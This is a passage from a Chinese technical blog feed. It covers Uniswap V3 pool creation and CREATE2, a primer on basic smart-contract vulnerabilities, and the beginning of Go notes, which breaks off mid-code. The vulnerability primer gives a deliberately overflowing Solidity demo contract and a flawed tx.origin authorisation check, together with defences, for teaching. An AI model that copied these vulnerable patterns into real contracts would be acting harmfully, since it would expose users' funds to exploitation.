tokenB,<br>    uint24 fee<br>) external view returns (address pool);<br></code></pre></td></tr></table></figure><p>在UniswapV3Factory中的getPool</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UniswapV3Factory is IUniswapV3Factory, UniswapV3PoolDeployer, NoDelegateCall &#123;<br>    ...<br>    mapping(address =&gt; mapping(address =&gt; mapping(uint24 =&gt; address))) public override getPool;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="createPool"><a href="#createPool" class="headerlink" title="createPool"></a>createPool</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @inheritdoc IUniswapV3Factory<br>    function createPool(<br>        address tokenA,<br>        address tokenB,<br>        uint24 fee //期望的费率<br>    ) external override noDelegateCall returns (address pool) &#123;<br>    //检查是否是同一token<br>        require(tokenA != tokenB);<br>        //将TokenA与TokenB根据地址进行升序排列<br>        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);<br>        //检查token0是否为空地址<br>        require(token0 != address(0));<br>        //根据费率检索TickSpace并检查TickSpace是否为0<br>        int24 tickSpacing = feeAmountTickSpacing[fee];<br>        require(tickSpacing != 0);<br>        //检查当前新建的池子是否已经存在<br>        require(getPool[token0][token1][fee] == address(0));<br>        //核心是调用 deploy 函数完成交易对的创建<br>        pool = deploy(address(this), token0, token1, fee, tickSpacing);<br>        getPool[token0][token1][fee] = pool;<br>        // populate mapping in the reverse direction, deliberate choice to avoid the cost of comparing addresses<br>        //提供了反向映射，减少后期检索时比较地址的成本<br>        getPool[token1][token0][fee] = pool;<br>        emit PoolCreated(token0, token1, fee, tickSpacing, pool);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><p>位于合约UniswapV3PoolDeployer中，被UniswapV3Factory继承</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @dev Deploys a pool with the given parameters by transiently setting the parameters storage slot and then<br>/// clearing it after deploying the pool.<br>/// @param factory The contract address of the Uniswap V3 factory<br>/// @param token0 The first token of the pool by address sort order<br>/// @param token1 The second token of the pool by address sort order<br>/// @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip<br>/// @param tickSpacing The spacing between usable ticks<br>function deploy(<br>    address factory,<br>    address token0,<br>    address token1,<br>    uint24 fee,<br>    int24 tickSpacing<br>) internal returns (address pool) &#123;<br>    parameters = Parameters(&#123;factory: factory, token0: token0, token1: token1, fee: fee, tickSpacing: tickSpacing&#125;);<br>    pool = address(new UniswapV3Pool&#123;salt: keccak256(abi.encode(token0, token1, fee))&#125;());<br>    delete parameters;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="CREATE2和CREATE"><a href="#CREATE2和CREATE" class="headerlink" title="CREATE2和CREATE"></a>CREATE2和CREATE</h3><p>CREATE指令创建的合约地址是通通过交易发起者（sender）的地址以及交易序号（nonce）来计算确定的。sender 和 nonce 进行 RLP 编码，然后用 Keccak-256 进行 hash 计算（伪码）：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">keccak256</span><span class="hljs-params">(rlp([sender, nonce])</span></span>)<br></code></pre></td></tr></table></figure><p>而 CREATE2 指令则主要是根据创建合约的初始化代码(init_code)及盐（slat） 生成(伪码)，让生成的合约地址更具有可控性：</p><p>一般而言init_code==bytecode，就是编译生成的字节码，借此让地址变成了对合约代码的验证</p><p>CREATE2 的另一个值得注意的（有用的）是，由于其对计算合约地址的参数多了一点控制， <strong>如果一个合约自毁了，那么新合约未来可以再次部署到这个地址上</strong>。但是，如果已经有非自毁合约部署到这个地址上了，那么 CREATE2 不能在这个地址上再次部署一个合约。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">keccak256</span>(<span class="hljs-number">0</span><span class="hljs-variable">xff</span> + <span class="hljs-variable"><span class="hljs-class">sender</span></span> + <span class="hljs-variable">salt</span> + <span class="hljs-title">keccak256</span>(<span class="hljs-variable">init_code</span>))</span><br></code></pre></td></tr></table></figure><p>函数deploy中使用CREATE2来创建合约</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pool</span> = address(new UniswapV<span class="hljs-number">3</span>Pool&#123;salt: keccak<span class="hljs-number">256</span>(abi.encode(token<span class="hljs-number">0</span>, token<span class="hljs-number">1</span>, fee))&#125;());<br></code></pre></td></tr></table></figure><p>优点</p><ul><li><p>可以在链下计算出已经创建的交易池的地址</p></li><li><p>其他合约不必通过 UniswapV3Factory 中的接口来查询交易池的地址，可以节省 gas</p></li><li><p>合约地址不会因为reorg （区块重组、分叉） 而改变</p></li><li><p>如果一个合约自毁了，那么新合约未来可以再次部署到这个地址上</p></li><li><p>在未部署前可以提前获取合约地址</p></li></ul><p>可以依据bytecode计算合约地址，例如在library PoolAddress中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @title Provides functions for deriving a pool address from the factory, tokens, and the fee<br>library PoolAddress &#123;<br>    bytes32 internal constant POOL_INIT_CODE_HASH = 0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54;<br><br>    /// @notice The identifying key of the pool<br>    struct PoolKey &#123;<br>        address token0;<br>        address token1;<br>        uint24 fee;<br>    &#125;<br><br>...<br><br>    /// @notice Deterministically computes the pool address given the factory and PoolKey<br>    /// @param factory The Uniswap V3 factory contract address<br>    /// @param key The PoolKey<br>    /// @return pool The contract address of the V3 pool<br>    function computeAddress(address factory, PoolKey memory key) internal pure returns (address pool) &#123;<br>        require(key.token0 &lt; key.token1);<br>        pool = address(<br>            uint256(<br>                keccak256(<br>                    abi.encodePacked(<br>                        hex&#x27;ff&#x27;,<br>                        factory,<br>                        keccak256(abi.encode(key.token0, key.token1, key.fee)),<br>                        POOL_INIT_CODE_HASH<br>                    )<br>                )<br>            )<br>        );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>新交易对合约的构造函数中会反向查询 <code>UniswapV3Factory</code> 中的 parameters 值来进行初始变量的赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UniswapV3Pool is IUniswapV3Pool, NoDelegateCall &#123;<br>...<br>constructor() &#123;<br>    int24 _tickSpacing;<br>    (factory, token0, token1, fee, _tickSpacing) = IUniswapV3PoolDeployer(msg.sender).parameters();<br>    tickSpacing = _tickSpacing;<br><br>    maxLiquidityPerTick = Tick.tickSpacingToMaxLiquidityPerTick(_tickSpacing);<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么不直接使用参数传递来对新合约的状态变量赋值呢。这是因为 <code>CREATE2</code> 会将合约的 <code>initcode</code> 和 <code>salt</code> 一起用来计算创建出的合约地址。而 <code>initcode</code> 是包含 <code>contructor</code> code 和其参数的，如果合约的 <code>constructor</code> 函数包含了参数，那么其 <code>initcode</code> 将因为其传入参数不同而不同。在 off-chain 计算合约地址时，也需要通过这些参数来查询对应的 <code>initcode</code>。为了让合约地址的计算更简单，这里的 <code>constructor</code> 不包含参数（这样合约的 <code>initcode</code> 将时唯一的），而是使用动态 call 的方式来获取其创建参数。</p><h2 id="initialize"><a href="#initialize" class="headerlink" title="initialize"></a>initialize</h2><p>在合约UniswapV3Pool中，对创建的交易对合约进行初始化。所有交易池的参数和状态用一个数据结构Slot0来记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    struct Slot0 &#123;<br>        // the current price<br>        uint160 sqrtPriceX96;<br>        // the current tick<br>        int24 tick;<br>        // the most-recently updated index of the observations array<br>        uint16 observationIndex;<br>        // the current maximum number of observations that are being stored<br>        uint16 observationCardinality;<br>        // the next maximum number of observations to store, triggered in observations.write<br>        uint16 observationCardinalityNext;<br>        // the current protocol fee as a percentage of the swap fee taken on withdrawal<br>        // represented as an integer denominator (1/x)%<br>        uint8 feeProtocol;<br>        // whether the pool is locked<br>        bool unlocked;<br>    &#125;<br>    /// @inheritdoc IUniswapV3PoolState<br>    Slot0 public override slot0;<br><br>/// @inheritdoc IUniswapV3PoolActions<br>    /// @dev not locked because it initializes unlocked<br>    //这里的sqrtPriceX96为sqrt(amountToken1/amountToken0)Q64.96精度的定点数值<br>    function initialize(uint160 sqrtPriceX96) external override &#123;<br>        //检查池子价格是否未初始化<br>        require(slot0.sqrtPriceX96 == 0, &#x27;AI&#x27;);<br><br>        //计算最大的tick<br>        int24 tick = TickMath.getTickAtSqrtRatio(sqrtPriceX96);<br><br>        //获取cardinality(基数)与cardinalityNext(下一个基数)的数值<br>        (uint16 cardinality, uint16 cardinalityNext) = observations.initialize(_blockTimestamp());<br><br>        //对slot0进行初始化操作<br>        slot0 = Slot0(&#123;<br>            sqrtPriceX96: sqrtPriceX96,<br>            tick: tick,<br>            observationIndex: 0,<br>            observationCardinality: cardinality,<br>            observationCardinalityNext: cardinalityNext,<br>            feeProtocol: 0,<br>            unlocked: true<br>        &#125;);<br><br>        emit Initialize(sqrtPriceX96, tick);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>初始化主要是设置了交易池的初始价格（注意，此时池子中还没有流动性），以及费率，tick 等相关变量的初始化。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>合约基础漏洞</title>
    <link href="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><h2 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h2><p>通常来说，在编程语言里由算数问题导致的整数溢出漏洞屡见不鲜，在区块链的世界里，智能合约的Solidity语言中也存在整数溢出问题，整数溢出一般分为又分为上溢和下溢，在智能合约中出现整数溢出的类型包括三种：</p><ul><li>乘法溢出</li><li>加法溢出</li><li>减法溢出</li></ul><p>在Solidity语言中，变量支持的整数类型步长以8递增，支持从uint8到uint256，以及int8到int256。例如，一个 uint8类型 ，只能存储在范围 0到2^8-1，也就是[0,255] 的数字，一个 uint256类型 ，只能存储在范围 0到2^256-1的数字。</p><p>在以太坊虚拟机（EVM）中为整数指定固定大小的数据类型，而且是无符号的，这意味着在以太坊虚拟机中一个整型变量只能有一定范围的数字表示，不能超过这个制定的范围。</p><p>如果试图存储 256这个数字 到一个 uint8类型中，这个256数字最终将变成 0，所以整数溢出的原理其实很简单，为了说明整数溢出原理，这里以 8 (uint8)位无符整型为例，8 位整型可表示的范围为 [0, 255]，255 在内存中存储按位存储的形式为下图所示：</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/v2-72bafea677bd6b52b94cdd7f45c49b73_720w.png" alt="img"></p><p>8 位无符整数 255 在内存中占据了 8bit 位置，若再加上 1 整体会因为进位而导致整体翻转为 0，最后导致原有的 8bit 表示的整数变为 0。</p><p>上图即说明了智能合约中整数上溢的原理，同样整数下溢也是一样，如 <code>(uint8)0 - 1 = (uint8)255</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.12;<br>contract POC&#123;<br>    uint256 public add = 2**256 - 1;<br>    uint256 public sub = 0;<br>    uint256 public mul = 2**255;<br>    //加法溢出<br>    //如果uint256 类型的变量达到了它的最大值(2**256 - 1)，如果在加上一个大于0的值便会变成0<br>    function add_overflow() public view returns (uint256) &#123;<br>        return add + 1;<br>    &#125;<br><br>    //减法溢出<br>    //如果uint256 类型的变量达到了它的最小值(0)，如果在减去一个小于0的值便会变成2**256-1(uin256类型的最大值)<br>    function sub_underflow() public view returns (uint256) &#123;<br>        return sub - 1;<br>    &#125;<br>    <br>    //乘法溢出<br>    //如果uint256 类型的变量超过了它的最大值(2**256 - 1)，最后它的值就会回绕变成0<br>    function mul_overflow()public view returns (uint256) &#123;<br>        return mul * 2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220806235658226.png" alt="image-20220806235658226"></p><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p>为了防止整数溢出的发生，一方面可以在算术逻辑前后进行验证，另一方面可以直接使用 OpenZeppelin 维护的一套智能合约函数库中的 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath">SafeMath</a> 来处理算术逻辑。</p><p>注意：0.8版本的solidity默认使用 SafeMath，一旦溢出直接回退</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br>import &quot;@openzeppelin/contracts/utils/math/SafeMath.sol&quot;;<br>contract safe&#123;<br>    using SafeMath for uint256;<br>    uint256 public add = 2**256 - 1;<br>    uint256 public sub = 0;<br>    uint256 public mul = 2**255;<br><br>    function add_overflow() public view returns (uint256) &#123;<br>        return add + 1;<br>    &#125;<br><br>    function sub_underflow() public view returns (uint256) &#123;<br>        return sub - 1;<br>    &#125;<br>    <br>    function mul_overflow()public view returns (uint256) &#123;<br>        return mul * 2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时将调用失败</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220807000410789.png" alt="image-20220807000410789"></p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p><a href="https://sissice.github.io/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/">Ethernaut 5.Token</a></p><h1 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h1><p>之前的文章 <a href="https://sissice.github.io/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/">智能合约重入漏洞</a></p><h1 id="随机数漏洞"><a href="#随机数漏洞" class="headerlink" title="随机数漏洞"></a>随机数漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>之前的文章 <a href="https://sissice.github.io/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/">智能合约错误随机性</a></p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>block.blockhash(block.number-1)：<a href="https://sissice.github.io/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/">Ethernaut 3.Coin Flip</a></p><h1 id="tx-origin"><a href="#tx-origin" class="headerlink" title="tx.origin"></a>tx.origin</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>tx.origin和msg.sender很直观的区别</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220814210003053.png" alt="image-20220814210003053"></p><p>tx.origin 不应用于授权。例如，如果所有者设置为</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">address owner = msg.sender<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>但是函数的访问检查是用</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">require(owner == tx.origin)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这可能会被利用。</p><h2 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h2><p><a href="https://sissice.github.io/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/">Ethernaut闯关 4.Telephone</a></p><h1 id="call调用"><a href="#call调用" class="headerlink" title="call调用"></a>call调用</h1><h2 id="原理简介-1"><a href="#原理简介-1" class="headerlink" title="原理简介"></a>原理简介</h2><p>call</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220814213108897.png" alt="image-20220814213108897"></p><p>delegateCall</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220814213131853.png" alt="image-20220814213131853"></p><h2 id="案例分析-1"><a href="#案例分析-1" class="headerlink" title="案例分析"></a>案例分析</h2><p><a href="https://sissice.github.io/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/">Ethernaut闯关 6.Delegation</a></p><p><a href="https://sissice.github.io/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/">Ethernaut闯关 16. Preservation</a></p><h1 id="合约变量存储机制"><a href="#合约变量存储机制" class="headerlink" title="合约变量存储机制"></a>合约变量存储机制</h1><p>之前的文章 <a href="https://sissice.github.io/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/">合约变量存储机制</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GO语言学习笔记</title>
    <link href="/2022/08/13/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/08/13/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="go语言学习笔记"><a href="#go语言学习笔记" class="headerlink" title="go语言学习笔记"></a>go语言学习笔记</h1><h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><p><a href="https://juejin.cn/post/7119123646471208968">《Go学习路线图》</a></p><p><a href="https://books.studygolang.com/gopl-zh/">go语言圣经</a> </p><p><a href="https://gfw.go101.org/">Go语言101</a></p><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">&amp;</td><td align="left">按位与运算符”&amp;”是双目运算符。 其功能是参与运算的两数各对应的二进位相与。如果对应的位都为1，那么结果就是1， 如果任意一个位是0 则结果就是0</td><td align="left">(A &amp; B) 结果为 12, 二进制为 0000 1100</td></tr><tr><td align="left">|</td><td align="left">按位或运算符”|”是双目运算符。 其功能是参与运算的两数各对应的二进位相或。如果对应的位中任一个操作数为1 那么结果就是1</td><td align="left">(A | B) 结果为 61, 二进制为 0011 1101</td></tr><tr><td align="left">^</td><td align="left">按位异或运算符”^”是双目运算符。 其功能是参与运算的两数各对应的二进位相异或，当两对应的二进位相异时，结果为1。</td><td align="left">(A ^ B) 结果为 49, 二进制为 0011 0001</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">左移运算符”&lt;&lt;”是双目运算符。左移n位就是乘以2的n次方。 其功能把”&lt;&lt;”左边的运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td><td align="left">A &lt;&lt; 2 结果为 240 ，二进制为 1111 0000</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">右移运算符”&gt;&gt;”是双目运算符。右移n位就是除以2的n次方。 其功能是把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数。</td><td align="left">A &gt;&gt; 2 结果为 15 ，二进制为 0000 1111</td></tr></tbody></table><h2 id="匿名结构体"><a href="#匿名结构体" class="headerlink" title="匿名结构体"></a>匿名结构体</h2><p>这个例子展示了简单的cache，其使用两个包级别的变量来实现，一个mutex互斥量（§9.2）和它所操作的cache：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>    mu sync.Mutex <span class="hljs-comment">// guards mapping</span><br>    mapping = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span>)<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Lookup</span><span class="hljs-params">(key <span class="hljs-keyword">string</span>)</span> <span class="hljs-title">string</span></span> &#123;<br>    mu.Lock()<br>    v := mapping[key]<br>    mu.Unlock()<br>    <span class="hljs-keyword">return</span> v<br>&#125;<br></code></pre></td></tr></table></figure><p>下面这个版本在功能上是一致的，但将两个包级别的变量放在了cache这个struct一组内：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//依次进行了定义、初始化、赋值</span><br><span class="hljs-keyword">var</span> cache = <span class="hljs-keyword">struct</span> &#123;<br>    sync.Mutex<br>    mapping <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span><br>&#125;&#123;<br>    mapping: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span>),<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Lookup</span><span class="hljs-params">(key <span class="hljs-keyword">string</span>)</span> <span class="hljs-title">string</span></span> &#123;<br>    cache.Lock()<br>    v := cache.mapping[key]<br>    cache.Unlock()<br>    <span class="hljs-keyword">return</span> v<br>&#125;<br></code></pre></td></tr></table></figure><p>我们给新的变量起了一个更具表达性的名字：cache。因为sync.Mutex字段也被嵌入到了这个struct里，其Lock和Unlock方法也就都被引入到了这个匿名结构中了，这让我们能够以一个简单明了的语法来对其进行加锁解锁操作。</p><p>一个应用的例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br> <br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/json&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><span class="hljs-comment">//定义手机屏幕</span><br><span class="hljs-keyword">type</span> Screen01 <span class="hljs-keyword">struct</span> &#123;<br>Size       <span class="hljs-keyword">float64</span> <span class="hljs-comment">//屏幕尺寸</span><br>ResX, ResY <span class="hljs-keyword">int</span> <span class="hljs-comment">//屏幕分辨率 水平 垂直</span><br>&#125;<br><span class="hljs-comment">//定义电池容量</span><br><span class="hljs-keyword">type</span> Battery <span class="hljs-keyword">struct</span> &#123;<br>Capacity <span class="hljs-keyword">string</span><br>&#125;<br> <br><span 